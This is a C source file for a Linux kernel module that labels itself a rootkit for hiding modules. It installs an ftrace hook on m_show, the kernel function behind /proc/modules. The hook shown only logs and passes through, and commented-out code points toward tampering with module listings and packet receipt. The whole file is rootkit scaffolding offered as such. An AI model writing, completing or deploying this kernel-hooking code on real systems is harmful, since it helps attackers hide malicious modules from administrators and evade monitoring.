#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <net/ip.h>

#include "ftrace_helper2.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a kernel module rootkit");
MODULE_VERSION("1");


 // asmlinkage int (*old_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 // 	   struct net_device *orig_dev);
 // asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 // 	   struct net_device *orig_dev);

static asmlinkage int new_m_show(struct seq_file *m, void *p);
static asmlinkage int (*old_m_show)(struct seq_file *m, void *p);


static struct ftrace_hook hooks[] = {
 	HOOK("m_show", new_m_show, &old_m_show),
 };


static int __init rootkit_enter(void) {

	int err;

	printk(KERN_INFO "module hiding rootkit: is operating\n");
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;


	 return 0;
}

static void __exit rootkit_exit(void) {


	//remove ftrace hooks
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "module hiding rootkit: stopped\n");
}




// static int m_show(struct seq_file *m, void *p)
// {
// 	struct module *mod = list_entry(p, struct module, list);
// 	char buf[MODULE_FLAGS_BUF_SIZE];
// 	void *value;

// 	/* We always ignore unformed modules. */
// 	if (mod->state == MODULE_STATE_UNFORMED)
// 		return 0;

// 	seq_printf(m, "%s %u",
// 		   mod->name, mod->init_layout.size + mod->core_layout.size);
// 	print_unload_info(m, mod);

// 	/* Informative for users. */
// 	seq_printf(m, " %s",
// 		   mod->state == MODULE_STATE_GOING ? "Unloading" :
// 		   mod->state == MODULE_STATE_COMING ? "Loading" :
// 		   "Live");
// 	/* Used by oprofile and other similar tools. */
// 	value = m->private ? NULL : mod->core_layout.base;
// 	seq_printf(m, " 0x%px", value);

// 	/* Taints info */
// 	if (mod->taints)
// 		seq_printf(m, " %s", module_flags(mod, buf));

// 	seq_puts(m, "\n");
// 	return 0;
// }


static asmlinkage int new_m_show(struct seq_file *m, void *p)
{
	printk(KERN_INFO "successfuly hooked m_show\n");
	return old_m_show(m, p);
}


module_init(rootkit_enter);
module_exit(rootkit_exit);

